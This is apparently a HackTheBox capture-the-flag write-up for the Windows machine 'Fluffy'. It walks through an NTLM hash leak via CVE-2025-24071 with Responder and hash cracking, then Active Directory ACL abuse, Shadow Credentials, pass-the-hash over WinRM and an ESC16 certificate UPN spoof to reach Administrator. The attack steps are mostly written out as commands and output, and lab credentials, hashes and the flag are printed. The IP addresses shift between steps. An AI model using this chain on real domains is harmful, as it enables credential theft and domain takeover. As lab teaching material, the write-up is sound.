---
title: "HackTheBox - Fluffy"
date: 2026-02-06 00:00:00 +0800
categories: [HackTheBox - Easy Machines]
tags: [HackTheBox CTFs]
---


---

`Fluffy` is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the `winrm_svc` and `ca_svc` accounts. `WinRM` can then be used to log in to the target using the `winrc_svc` account. Exploitation of an Active Directory Certificate service (`ESC16`) using the `ca_svc` account is required to obtain access to the `Administrator` account.

---
## 1. Enumeration Phase

#### Given Credentials

We are provided with valid domain credentials to begin authenticated enumeration:

**Given Credentials**
- **Username:** `j.fleischman`
- **Password:** `J0elTHEM4n1990!`

These credentials will be used to validate access across exposed services and to perform authenticated enumeration where possible.

---

#### Port and Service Enumeration

We begin by scanning the target host for open ports and service versions using Nmap.

```shell
─$ ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

─$ sudo nmap -p$ports -sC -sV 10.129.232.88 
  
Nmap scan report for 10.129.232.88                                                                                                              
53/tcp    open  domain        Simple DNS Plus      
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-27 03:02:40Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb    
...
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb                                         ...
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-01-27T03:04:17+00:00; +7h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC

...
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2026-01-27T03:03:39
|_  start_date: N/A
...
```


**Relevant Services Identified:**
- **Port 53/tcp** – DNS
- **Port 88/tcp** – Kerberos Authentication Service
- **Port 139/tcp** – NetBIOS Session Service
- **Port 389/tcp** – LDAP (Active Directory)
- **Port 445/tcp** – SMB (Microsoft-DS)
- **Port 464/tcp** – Kerberos Password Change (kpasswd)
- **Port 593/tcp** – RPC over HTTP
- **Port 636/tcp** – LDAPS
- **Port 3268/tcp** – Global Catalog LDAP
- **Port 5985/tcp** – WinRM (HTTP)
- **Port 9389/tcp** – Active Directory Web Services
- **Ports 49xxx/tcp** – Dynamic MSRPC ports

The LDAP and LDAPS services identify the domain as `fluffy.htb`, and the SSL certificate common name reveals the hostname `DC01.fluffy.htb`.

The presence of Kerberos, LDAP/LDAPS, Global Catalog, AD Web Services, and multiple RPC endpoints confirms that this host is a **Domain Controller**.

---
#### Clock Skew Observation

Nmap reports a clock skew of approximately **7 hours** between the attacking host and the Domain Controller. This is significant because Kerberos authentication is time-sensitive. Large clock skew can cause Kerberos-based attacks or authentication attempts to fail and may require local time synchronization on the attacking machine. Let's keep this in mind.

---
#### Adding the Domain Name and DNS Name to hosts file

To ensure proper name resolution (required for Kerberos and many AD tools), we add the domain and Domain Controller hostname to `/etc/hosts`.

```shell
echo "10.129.232.88 fluffy.htb DC01.fluffy.htb" | sudo tee -a /etc/hosts  
```

---

#### SMB Enumeration - `Port 445`

With valid credentials available, we proceed with authenticated SMB enumeration using CrackMapExec.

```shell
└─$ crackmapexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

The authentication succeeds, confirming the credentials are valid. However, initial share enumeration returns `STATUS_ACCESS_DENIED`.

This behavior is common on hardened Domain Controllers and does **not** indicate invalid credentials. SMB signing, restricted enumeration permissions, or tooling limitations can prevent share listing despite successful authentication.

Re-running enumeration with an increased timeout results in successful share enumeration:

```shell
crackmapexec --timeout 30 smb 10.129.11.139 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares 
```

This ends up listing the shares

```shell
SMB         10.129.11.139   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.139   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.11.139   445    DC01             [+] Enumerated shares
SMB         10.129.11.139   445    DC01             Share           Permissions     Remark
SMB         10.129.11.139   445    DC01             -----           -----------
SMB         10.129.11.139   445    DC01             ADMIN$                          
SMB         10.129.11.139   445    DC01             C$                              
SMB         10.129.11.139   445    DC01             IPC$            READ            
SMB         10.129.11.139   445    DC01             IT              READ,WRITE      
SMB         10.129.11.139   445    DC01             NETLOGON        READ            
SMB         10.129.11.139   445    DC01             SYSVOL          READ            
```

---

#### Enumerated SMB Shares

The following shares are identified:

- **ADMIN$** – Administrative share (not accessible without admin privileges)
- **C$** – Administrative share (not accessible without admin privileges)
- **IPC$** – Inter-process communication (READ)
- **NETLOGON** – READ
- **SYSVOL** – READ
- **IT** – READ, WRITE

While `ADMIN$` and `C$` are visible, standard domain users do not have access to them without elevated privileges. However, I notice that there is a non-default share that we have read and write permissions on. Let's attempt to connect to the `IT` SMB Share.

---

#### Accessing the IT Share

We connect to the IT share using `smbclient`:

```shell
└─$ smbclient //10.129.11.139/IT -U j.fleischman 
```

This works after providing the credentials `J0elTHEM4n1990!` for the user we were given. 

During enumeration of the share contents, a file named `Upgrade_Notice.pdf` is discovered and downloaded for offline analysis.

```shell
smb: \> get Upgrade_Notice.pdf
```

Upon inspection, we see the below:

![Description](assets/HTB-Fluffy-CTF-Images/HTB - Fluffy CTF - img1.png)

The document appears to be an internal IT communication referencing upcoming system upgrades and associated security patches.

While the document mentions specific CVEs, this does **not** guarantee that the Domain Controller or associated systems are currently unpatched. However, it provides useful context and potential leads for validating patch levels and identifying possible attack paths.

At this stage, the document serves as **informational intelligence**, not confirmation of exploitability.

----

## 2. Pre-Exploitation Phase

#### CVE-2025-24071

After researching the list of CVEs, I decided that the one with the best and most information is **CVE-2025-24071**. The explanations were a bit bad but essentially, the vulnerability occurs when a user extracts a ZIP archive containing a specially crafted `.library-ms` file. Windows Explorer automatically initiates an SMB authentication request to a remote server specified in the file, leaking the user's NTLM hash without any user interaction. 

I decided to use an Metasploit module to do this. I've outlined all the steps below to prepare the exploit.

1. Clone the repository:

```shell
git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
cd CVE-2025-24071-msfvenom
```

2. Copy the module to the Metasploit modules directory:

```shell
cp ntlm_hash_leak.rb ~/.msf4/modules/auxiliary/server/
```


----

## 3. Exploitation Phase


#### Running the CVE-2025-24071 exploit

Once the module is copied to the Metasploit modules directory, we can begin with the fun part 😀. See the steps below for how I went about performing the exploit in Metasploit:

1. Load the module:

```shell
use auxiliary/server/ntlm_hash_leak
```

2. Set the required options:

```shell
set ATTACKER_IP 10.129.11.139  # Replace with your IP address
set FILENAME exploit.zip       # Name of the malicious ZIP file
set LIBRARY_NAME malicious.library-ms  # Name of the .library-ms file
set SHARE_NAME IT          # SMB share name
```

3. Run the module :

```shell
  run
```

4. The module will generate a malicious ZIP file *(exploit.zip)*. Host this file for the victim to download and extract. In our case, we are uploading the file to the `IT` Share we found earlier

Once the `exploit.zip` file is generated, we can upload it to the `IT` Share we found earlier. 

```shell
put exploit.zip
```

However, before doing the above, we first have to start Responder so that we can get back the NTLM hash.

```shell
sudo responder -I tun0
```

Once Responder is listening and we upload the exploit file to the `IT` share, we wait a bit...

Boom!!!!

We got the `NTLMv2` Hash for the user `p.agila`

![Description](assets/HTB-Fluffy-CTF-Images/HTB - Fluffy CTF - img2.png)

```
p.agila::FLUFFY:644b9cbaaf880144:3F3684DC990FFB9906EBB0E5D6B45427:010100000000000080296AF37E91DC016E1C33453059CD780000000002000800550049004600390001001E00570049004E002D0044004700560036004A0033004100480032004500420004003400570049004E002D0044004700560036004A003300410048003200450042002E0055004900460039002E004C004F00430041004C000300140055004900460039002E004C004F00430041004C000500140055004900460039002E004C004F00430041004C000700080080296AF37E91DC0106000400020000000800300030000000000000000100000000200000D8480478ECF3918210582A99C27A11A530F7F26EDA0EBACFEF99D01EE675F32B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380030000000000000000000
```

Let's save the hash to a txt file so we can begin cracking it.

```shell
└─$ echo 'p.agila::FLUFFY:644b9cbaaf880144:3F3684DC990FFB9906EBB0E5D6B45427:010100000000000080296AF37E91DC016E1C33453059CD780000000002000800550049004600390001001E00570049004E002D0044004700560036004A0033004100480032004500420004003400570049004E002D0044004700560036004A003300410048003200450042002E0055004900460039002E004C004F00430041004C000300140055004900460039002E004C004F00430041004C000500140055004900460039002E004C004F00430041004C000700080080296AF37E91DC0106000400020000000800300030000000000000000100000000200000D8480478ECF3918210582A99C27A11A530F7F26EDA0EBACFEF99D01EE675F32B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380030000000000000000000' > agilaNTLMHash.txt

```

Once saved, I begin the cracking with Hashcat:

```shell
hashcat -m 5600 agilaNTLMHash.txt /usr/share/wordlists/rockyou.txt
```

![Description](assets/HTB-Fluffy-CTF-Images/HTB - Fluffy CTF - img3.png)

YAY!!!! 

We successfully crack the password which is `prometheusx-303`. So now we have another set of credentials we can use to enumerate all over again with. Remember when finding credentials to always perform the enumeration stage again with the new credentials.

**Found Credentials**
- **Username:** `p.agila`
- **Password:** `prometheusx-303`

---
## Post-Exploitation Phase

#### Bloodhound Enumeration

With valid domain credentials, I began post-exploitation by enumerating Active Directory relationships using BloodHound to identify privilege escalation paths.

```shell
└─$ sudo bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.11.139 -d fluffy.htb -c all    
```

After ingesting the data into BloodHound, the graph revealed an interesting privilege chain.

![Description](assets/HTB-Fluffy-CTF-Images/HTB - Fluffy CTF - img4.png)

The user `P.AGILA@FLUFFY.HTB` is a member of the `Service Account Managers` group. This group has **GenericAll** rights on the `Service Accounts` group.  This group has access to more users so would be good if we can attempt to join the group.

`GenericAll` effectively grants full control, including the ability to modify group membership. Since the _Service Accounts_ group contains higher-privileged users, adding ourselves to this group could expand our access and create further escalation opportunities.

---

#### Exploiting the ACL Misconfiguration

Given the excessive permissions, I leveraged **bloodyAD** to add my user to the target group.

```shell
└─$ bloodyAD --host 10.129.11.139 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember "Service Accounts" P.AGILA

[+] P.AGILA added to Service Accounts
```

Verify Group Membership

```shell
└─$ bloodyAD --host 10.129.11.139 -d fluffy.htb -u p.agila -p 'prometheusx-303' get membership P.AGILA  

...

distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
objectSid: S-1-5-21-497550768-2797716248-2627064577-1607
sAMAccountName: Service Accounts
```

This confirms the user was successfully added to the **Service Accounts** group. 

Because we now belong to a more privileged group, we inherit any permissions assigned to it. This significantly broadens our attack surface

---

#### Gaining Access to WINRM_SVC

After adding my user to the **Service Accounts** group, I inherited additional delegated permissions. BloodHound showed that this group has **GenericWrite** privileges over several service accounts:

- `WINRM_SVC`
- `CA_SVC`
- `LDAP_SVC`

Since `WINRM_SVC` is a member of the **Remote Management Users** group, compromising this account would likely grant **WinRM access**, making it the most direct path to interactive remote access. I decided to target this account first.

---

#### Enumerating Service Principal Names (SPNs) - FAIL

To identify Kerberoastable accounts, I enumerated SPNs across the domain using Impacket:

```shell
└─$ impacket-GetUserSPNs fluffy.htb/p.agila -dc-ip 10.129.11.139 -request               

...

ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 18:07:50.136701  2025-05-22 00:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 18:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 02:51:16.786913  2025-05-19 17:13:22.188468  
```

All three service accounts expose SPNs, meaning they are potential **Kerberoasting targets**.

Because `winrm_svc` directly enables remote management access, I focused on requesting a TGS ticket specifically for that account.

```shell
└─$ impacket-GetUserSPNs -dc-ip 10.129.11.139 fluffy.htb/p.agila -request-user winrm_svc
```

However, the request failed with:

```shell
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This error indicates a **time synchronization issue** between my attack machine and the Domain Controller. Kerberos is highly sensitive to clock drift, and even small differences can invalidate authentication requests.

I used the below to resolve this:

```shell
sudo ntpdate 10.129.11.139
```

After correcting the time skew, Kerberos ticket requests worked as expected.

However, this was a bit of a flop as I was unable to crack the ticket with the wordlists I had 😭. 


---

#### Shadow Credentials Attack (`winrm_svc`)

Since the **Service Accounts** group granted us **GenericWrite** over `winrm_svc`, we effectively had permission to modify attributes on that user object.

One particularly powerful abuse of `GenericWrite` is the **Shadow Credentials** technique.

Instead of cracking passwords or Kerberoasting, Shadow Credentials allow us to:

- Add a malicious **Key Credential** to the target account
- Authenticate using certificate-based Kerberos (PKINIT)
- Obtain a TGT as the victim
- Extract the NT hash directly

This approach is quieter and avoids password guessing or offline cracking entirely.

```shell
└─$ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc                    

...

[*] Trying to get TGT...
[*] Got TGT
...
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

Certipy performed the following actions:

1. Generated a certificate
2. Created a Key Credential
3. Added it to `winrm_svc`'s `msDS-KeyCredentialLink` attribute
4. Authenticated as `winrm_svc` using PKINIT
5. Requested a TGT
6. Extracted the NT hash
7. Restored the original Key Credentials (cleanup)

Getting the NT hash confirms successful impersonation and credential extraction for the service account.

---

#### Gaining Remote Access

Because `winrm_svc` is a member of the **Remote Management Users** group, the recovered NT hash can be used for **Pass-the-Hash authentication** over WinRM.

```shell
└─$ evil-winrm -i 10.129.11.139 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

This provided an interactive shell on the target system as `winrm_svc`.


---

## Root Privilege Escalation Phase

#### Retrieving the `ca_svc` NT Hash

Taking a look at the `ca_svc` user, this is the certificate authority service which may prove useful to have when checking for certificate attacks

```shell
faketime -f +7h certipy-ad shadow -account ca_svc -u 'p.agila@fluffy.htb'  -p 'prometheusx-303' auto
```

The above gave me the NT Hash for the `ca_svc` user:

**Found Credentials**
- **Username:** `ca_svc`
- **Hash:** `ca0f4f9e9eb8a092addf53bb03fc98c8`

I used `faketime` as for some reason `ntpdate` was not working well.


---

#### Abusing ESC16

We begin by enumerating the Certificate Authority configuration using Certipy to identify misconfigurations.

```shell
certipy-ad find -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -stdout  -text -vulnerable 
```

The output indicates the CA is vulnerable to **ESC16**.

> ESC16 occurs when:

- The CA globally disables the `szOID_NTDS_CA_SECURITY_EXT` extension
- Strong certificate-to-account binding is not enforced
- Identity mapping relies only on weak fields (UPN/SAN)

Without this extension, the CA **blindly trusts the UPN embedded in the certificate request**, meaning we can spoof another user’s identity by modifying an account’s UPN before enrollment.

----

#### Gain Control over a modifiable account

The user `p.agila` has **GenericWrite** over other users, allowing us to modify attributes such as:

- userPrincipalName
- servicePrincipalName
- other identity fields

This gives us control over how the account will appear inside issued certificates.

Our goal is to impersonate the `Administrator` account.

---

#### Spoof the UPN

We temporarily change the `ca_svc` account’s UPN to `administrator`.

```shell
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
```

Output:

```shell
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

**Notes:**
- DNS warning is harmless for LDAP operations
- Attribute update succeeded
- `ca_svc` now logically identifies as `administrator` for certificate enrollment

At this point, any certificate issued for `ca_svc` will embed:

```shell
UPN = administrator
```

---

#### Verify modification and Request Certificate

Before requesting a certificate, we confirm the change.

```shell
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

...
userPrincipalName                   : administrator
....

```

The UPN spoofing is confirmed.

We now request a certificate using the default **User template**.

```shell
certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

Because:

- the CA lacks strong mapping (ESC16)
- the template allows client authentication
- the UPN is spoofed

The issued certificate is trusted as `administrator@fluffy.htb`

If the security extension were enabled, this request would fail due to the UPN/account mismatch. The absence of this protection enables the impersonation.

---

#### Cleanup

Lets clean up and set UPN back to original

```shell
faketime -f +7h certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update 
```

Good operational practice:

- reduces audit noise
- maintains environment stability
- mimics realistic attacker tradecraft


---

#### Authenticate with forged certificate & Remote Access

Using the generated `.pfx`, we perform PKINIT authentication and extract the NTLM hash.

```shell
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
```

Output:

```shell
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

This gives us:

- Kerberos TGT
- Administrator NT hash

We perform pass‑the‑hash authentication via WinRM.

```shell
evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e 
```

Confirming administrative access:

```shell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
2f3f1bae7a5afad34e6f48621ebf0d08
```

YAY!!! All done... 

![Description](assets/HTB-Fluffy-CTF-Images/HTB - Fluffy CTF - img5.png)
